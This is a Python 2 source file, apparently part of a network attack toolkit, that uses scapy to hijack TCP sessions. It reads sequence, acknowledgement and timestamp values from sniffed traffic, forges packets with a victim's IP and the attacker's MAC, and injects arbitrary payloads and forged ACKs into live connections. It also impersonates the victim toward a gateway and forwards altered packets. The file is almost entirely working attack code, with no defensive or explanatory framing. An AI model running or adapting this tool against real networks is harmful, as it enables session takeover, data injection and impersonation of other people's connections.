__author__ = 'Nicholas Rodofile'
from Node import *
from portScan import *
from scapy.all import *
from interfaces import *
from threading import Thread
import time
from datetime import datetime

FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80
TS_increment = 2048
TS_Intival = 250  # per second


class Spoof(object):

    """ Error Message function"""
    def error(self, msg, summary=""):
        print '\033[91m' + msg + '\033[0m' + summary

    def show_verbose(self, str=None, function=None):
        if self.verbose:
            if str is not None:
                print str
            if function is not None:
                function()

    def __init__(self, source=None, destination=None, attacker=None, attack_function=None, verbose=1, sequence=None,
                 acknowledgement=None, interface="eth0"):
        self.source = source
        self.destination = destination
        self.attacker = attacker
        self.attack_function = attack_function
        self.verbose = verbose
        self.sequence = sequence
        self.acknowledgement = acknowledgement
        self.timestamp = 0
        self.timestamp_ts = 0
        self.timestamp_ecr = 0
        self.start_time = time.time()
        self.show_verbose(self.sequence)
        self.show_verbose(self.acknowledgement)
        self.source_port=None
        self.destination_port=None
        self.injected = False
        self.highjacked = False
        self.window_size = 905
        self.ack_lookup = {}
        self.ethernet = None
        self.ip = None
        self.spoofed = 0
        self.socket = conf.L2socket(iface=interface)
        if source is not None and destination is not None:
            self.ethernet = Ether(src=self.attacker.mac_address, dst=self.destination.mac_address)
            self.ip = IP(src=self.source.ip_address, dst=self.destination.ip_address)

    def show_all(self):
        print "-------------------------------"
        print self.source.name, "Spoofer"
        print "-------------------------------"
        print "Source\t:", self.source.summary()
        print "Destination\t:", self.destination.summary()
        print "Seq\t\t\t:", self.sequence
        print "Ack\t\t\t:", self.acknowledgement
        print "Source:", self.source_port, "Dst", self.destination_port
        print "TSval", self.timestamp, "TSecr", self.timestamp_ecr,  "\n"

    def sequence_update(self, pkt):
        if pkt.haslayer(TCP):
            self.sequence = pkt[TCP].ack
            self.acknowledgement = pkt[TCP].seq

    def sequence_conf(self, pkt):
        if pkt.haslayer(TCP):
            self.acknowledgement = pkt[TCP].ack
            self.sequence = pkt[TCP].seq
            self.source_port = pkt[TCP].sport
            self.destination_port = pkt[TCP].dport
            self.window_size = pkt[TCP].window
            for opt in pkt.getlayer(TCP).options:
                    if "Timestamp" in opt:
                        self.timestamp_ts = opt[1][0]
                        self.timestamp_ecr = opt[1][1]

    def update_packet_sequence(self, pkt):
        if pkt.haslayer(TCP):
            pkt[TCP].ack = self.sequence
            pkt[TCP].seq = self.acknowledgement
            pkt[TCP].sport = self.source_port
            pkt[TCP].dport = self.destination_port
        return pkt

    def sequence_configured(self):
        if self.sequence is None or self.acknowledgement is None:
            return False
        else:
            return True

    def get_timestamp(self, pkt):
        ticks = time.time() - self.start_time
        TSval = self.timestamp + int(ticks * TS_Intival)
        #print self.timestamp, TSval
        if pkt is not None:
            for opt in pkt.getlayer(TCP).options:
                if "Timestamp" in opt:
                    TSecr = opt[1][0]
                    return TSval, TSecr
        return TSval, self.timestamp_ts

    def spoof(self, pkt):
        if pkt.haslayer(Ether):
            if pkt.haslayer(TCP):
                self.sequence_conf(pkt)
                sendp(pkt, verbose=0)

                if self.verbose:
                    print "Spoofing ", self.source.name
                    print "Seq: ", self.sequence, "\tAck:", self.acknowledgement,  "\n"
        else:
            self.error("No Ethernet Layer! : ", pkt.summary())
        return pkt

    def inject(self, msg):
        if self.source is not None or self.attacker is not None:
            TSval, TSecr = self.get_timestamp(None)
            tcp = TCP(seq=self.acknowledgement, ack=self.sequence, sport=self.destination_port,
                      dport=self.source_port, flags='PA',
                      window=self.window_size,
                      options=[('Timestamp', (TSval, TSecr))])
            pkt = self.ethernet/self.ip/tcp/msg
            self.socket.send(pkt)
            self.injected = True
            self.highjacked = True
            if self.verbose:
                print "injecting packet", pkt.summary()
                print "Seq: ", tcp.seq, "\tAck:", tcp.ack,   " INJECTED\n"
        else:
            print "No Nodes!\n", self.show_all()

    def ack_injection(self, ack):
        if self.source is not None or self.attacker is not None:
            TSval, TSecr = self.get_timestamp(ack)
            tcp = TCP(seq=ack.ack, ack=ack.seq, sport=self.destination_port,
                      dport=self.source_port, flags='A',
                      options=[('Timestamp', (TSval, TSecr))])
            pkt = self.ethernet/self.ip/tcp
            #sendp(pkt, verbose=0)
            self.socket.send(pkt)
            self.show_verbose("Ack injected packet")
            self.sequence_conf(ack)
            if self.verbose:
                print "Seq: ", self.sequence, "\tAck:", self.acknowledgement,  " INJECTED Ack\n"
            self.injected = False
        else:
            print "No Nodes!\n", self.show_all()

    def retransmit_push_ack(self, pkt):
        if pkt.seq in self.ack_lookup:
            self.socket.send(self.ack_lookup[pkt.seq])
        if self.verbose:
            print "Seq: ", self.sequence, "\tAck:", self.acknowledgement,  " Spoofing Victim retransmit\n"

    def push_ack(self, pkt,  msg="Spoofing Victim"):
        self.spoofed += 1
        TSval, TSecr = self.get_timestamp(pkt)
        tcp = TCP(seq=pkt.ack, ack=self.sequence, sport=self.destination_port,
                  dport=self.source_port, flags='PA',
                  window=self.window_size,
                  options=[('Timestamp', (TSval, TSecr))])
        ack = self.ethernet/self.ip/tcp/msg
        #sendp(ack, verbose=0)
        self.socket.send(ack)
        self.sequence_conf(ack)
        if self.verbose:
            print "Seq: ", self.sequence, "\tAck:", self.acknowledgement,  " Spoofing Victim PA\n"
        self.ack_lookup[pkt.seq] = ack

    def forward(self, pkt):
        if pkt.haslayer(Ether):
            pkt[Ether].dst = self.destination.mac_address
            pkt[Ether].src = self.attacker.mac_address
        if pkt.haslayer(TCP):
            pkt[TCP].ack = self.sequence
            pkt[TCP].seq = self.acknowledgement
            TSval, TSecr = self.get_timestamp(None)
            pkt[TCP].options = [('Timestamp', (TSval, TSecr))]
            print "Condition met, Forwarding pkt"
            #pkt.show()
        self.socket.send(pkt)


    def ack(self, pkt):
        #self.sequence += 1
        #self.sequence += len(pkt[TCP].payload)
        TSval, TSecr = self.get_timestamp(pkt)
        tcp = TCP(seq=pkt.ack, ack=self.sequence, sport=self.destination_port,
                  dport=self.source_port, flags='A',
                  window=self.window_size,
                  options=[('Timestamp', (TSval, TSecr))])
        ack = self.ethernet/self.ip/tcp
        #sendp(ack, verbose=0)
        self.socket.send(ack)
        if self.verbose:
            print "Seq: ", self.sequence, "\tAck:", self.acknowledgement,  " Spoofing Victim Ack\n"
            print "Timestamps", TSval, TSecr

    def gateway_responder(self, pkt):
        if self.source is not None or self.attacker is not None:
            if pkt.haslayer(TCP):
                if pkt[TCP].seq < self.sequence:
                    self.retransmit_push_ack(pkt)
                elif pkt[TCP].flags == 24:
                    self.sequence += len(pkt[TCP].payload)
                    self.push_ack(pkt)
                    self.ack(pkt)
                    #self.push_ack(pkt)
                else:
                    pkt.summary()
        else:
            print "No Nodes!\n", self.show_all()


def init_spoof_pkt(pkt, source, destination, attack_function=None, verbose=1):
    if pkt.haslayer(TCP):
        s = Spoof(source, destination, attack_function=attack_function, sequence=pkt[TCP].seq,
                  acknowledgement=pkt[TCP].ack, verbose=verbose)
        return s
    else:
        print "NO TCP!!"
        print pkt.summary()
        return None